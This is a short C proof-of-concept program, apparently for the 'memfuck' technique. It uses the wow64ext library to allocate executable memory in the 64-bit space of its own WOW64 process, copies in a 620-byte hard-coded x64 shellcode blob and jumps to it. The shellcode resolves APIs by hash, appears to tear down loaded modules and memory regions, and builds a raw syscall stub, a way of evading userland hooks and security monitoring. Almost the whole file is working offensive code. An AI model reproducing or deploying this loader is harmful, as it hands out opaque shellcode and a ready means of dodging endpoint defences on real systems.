#include <Windows.h>
#include "wow64ext.h"
#include <stdio.h>	

// Shellcode from ShellcodeStdio project
unsigned char data[620] = {
	0xE9, 0x0B, 0x01, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48,
	0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x41, 0x57, 0x65,
	0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x44, 0x8B, 0xF9, 0x48, 0x8B, 0x50, 0x18, 0x4C,
	0x8B, 0x72, 0x20, 0x4D, 0x8B, 0xC6, 0x4D, 0x8B, 0x48, 0x20, 0x4D, 0x8B, 0x00, 0x4D, 0x85, 0xC9,
	0x0F, 0x84, 0x89, 0x00, 0x00, 0x00, 0x49, 0x63, 0x41, 0x3C, 0x42, 0x8B, 0x8C, 0x08, 0x88, 0x00,
	0x00, 0x00, 0x85, 0xC9, 0x74, 0x79, 0x4D, 0x8D, 0x14, 0x09, 0x41, 0x8B, 0x52, 0x0C, 0x49, 0x03,
	0xD1, 0x33, 0xFF, 0xEB, 0x16, 0xC1, 0xCF, 0x0D, 0x41, 0x0F, 0xBE, 0xCB, 0x41, 0x80, 0xFB, 0x61,
	0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03, 0xF8, 0x48, 0xFF, 0xC2, 0x44, 0x8A, 0x1A, 0x45, 0x84,
	0xDB, 0x75, 0xE2, 0x41, 0x8B, 0x52, 0x20, 0x45, 0x33, 0xDB, 0x49, 0x03, 0xD1, 0x45, 0x39, 0x5A,
	0x18, 0x76, 0x3C, 0x8B, 0x1A, 0x49, 0x03, 0xD9, 0x33, 0xF6, 0xEB, 0x16, 0xC1, 0xCE, 0x0D, 0x40,
	0x0F, 0xBE, 0xCD, 0x40, 0x80, 0xFD, 0x61, 0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03, 0xF0, 0x48,
	0xFF, 0xC3, 0x40, 0x8A, 0x2B, 0x40, 0x84, 0xED, 0x75, 0xE2, 0x8D, 0x04, 0x3E, 0x44, 0x3B, 0xF8,
	0x74, 0x31, 0x41, 0xFF, 0xC3, 0x48, 0x83, 0xC2, 0x04, 0x45, 0x3B, 0x5A, 0x18, 0x72, 0xC4, 0x4D,
	0x3B, 0xC6, 0x0F, 0x85, 0x5E, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x18, 0x48,
	0x8B, 0x6C, 0x24, 0x20, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x41, 0x5F,
	0x41, 0x5E, 0xC3, 0x41, 0x8B, 0x4A, 0x24, 0x49, 0x03, 0xC9, 0x46, 0x0F, 0xB7, 0x04, 0x59, 0x41,
	0x8B, 0x4A, 0x1C, 0x49, 0x03, 0xC9, 0x42, 0x8B, 0x04, 0x81, 0x49, 0x03, 0xC1, 0xEB, 0xCB, 0xCC,
	0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0xEC,
	0x48, 0x83, 0xEC, 0x48, 0xB9, 0x83, 0xD9, 0xBC, 0x06, 0xE8, 0xDA, 0xFE, 0xFF, 0xFF, 0xB9, 0x86,
	0x87, 0x21, 0x46, 0x48, 0x89, 0x45, 0xF0, 0xE8, 0xCC, 0xFE, 0xFF, 0xFF, 0xB9, 0x4D, 0x9C, 0xCA,
	0xBF, 0x4C, 0x8B, 0xE0, 0xE8, 0xBF, 0xFE, 0xFF, 0xFF, 0x65, 0x48, 0x8B, 0x0C, 0x25, 0x60, 0x00,
	0x00, 0x00, 0x33, 0xF6, 0x45, 0x33, 0xF6, 0x45, 0x33, 0xFF, 0x4C, 0x8B, 0xE8, 0x48, 0x8B, 0x51,
	0x18, 0x33, 0xC9, 0x4C, 0x8B, 0x4A, 0x20, 0x49, 0x8B, 0xD1, 0x4C, 0x8D, 0x02, 0x48, 0x8B, 0x12,
	0x83, 0xF9, 0x01, 0x75, 0x06, 0x4D, 0x8B, 0x78, 0x20, 0xEB, 0x14, 0x83, 0xF9, 0x02, 0x75, 0x06,
	0x49, 0x8B, 0x70, 0x20, 0xEB, 0x09, 0x83, 0xF9, 0x03, 0x75, 0x04, 0x4D, 0x8B, 0x70, 0x20, 0xFF,
	0xC1, 0x49, 0x3B, 0xD1, 0x75, 0xD4, 0x33, 0xDB, 0xBF, 0x00, 0x00, 0x08, 0x00, 0x83, 0x65, 0x48,
	0x00, 0x48, 0x8D, 0x45, 0x48, 0x41, 0xB9, 0x04, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20,
	0x4C, 0x8D, 0x45, 0x50, 0x48, 0x89, 0x5D, 0x60, 0x48, 0x8D, 0x55, 0x60, 0xC7, 0x45, 0x50, 0x01,
	0x00, 0x00, 0x00, 0x48, 0x83, 0xC9, 0xFF, 0x41, 0xFF, 0xD5, 0x48, 0x8B, 0xD3, 0x48, 0x83, 0xC9,
	0xFF, 0x41, 0xFF, 0xD4, 0x48, 0x81, 0xC3, 0x00, 0x10, 0x00, 0x00, 0x48, 0x83, 0xEF, 0x01, 0x75,
	0xBC, 0x48, 0x83, 0xCB, 0xFF, 0x48, 0x8B, 0xD6, 0x48, 0x8B, 0xCB, 0x41, 0xFF, 0xD4, 0x49, 0x8B,
	0xD6, 0x48, 0x8B, 0xCB, 0x41, 0xFF, 0xD4, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00,
	0x00, 0x48, 0xC7, 0x44, 0x24, 0x28, 0x40, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x4D, 0xE8, 0x48, 0x89,
	0x45, 0x58, 0x45, 0x33, 0xC0, 0x48, 0xC7, 0x45, 0xE8, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8D, 0x55,
	0x58, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x30, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xFF, 0x55, 0xF0,
	0x48, 0x8B, 0x45, 0x58, 0x49, 0x8B, 0xD7, 0x48, 0x8B, 0xCB, 0xC7, 0x00, 0x4C, 0x8B, 0xD1, 0xB8,
	0x48, 0x8B, 0x45, 0x58, 0xC7, 0x40, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0x58, 0xC7,
	0x40, 0x08, 0x0F, 0x05, 0xC3, 0x90, 0xFF, 0x55, 0x58, 0xCC, 0x48, 0x83, 0xC4, 0x48, 0x41, 0x5F,
	0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0x5D, 0xC3, 0xCC
};

// PoC:
// https://github.com/jackullrich/memfuck
// https://winternl.com/memfuck/

// Thanks to rewolf for all the heavy lifting with the wow64ext
// https://github.com/rwfpl/rewolf-wow64ext

int main(void) {
	
	SIZE_T dwWritten = 0;
	DWORD64 BaseAddress = 0x10000000000;
	
	DWORD64 ptr64Write = VirtualAllocEx64((HANDLE)-1, BaseAddress, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	DWORD64 NtStatus = WriteProcessMemory64((HANDLE)-1, BaseAddress, (LPVOID)data, sizeof(data), &dwWritten);
	
	X64Call(BaseAddress, 0);
}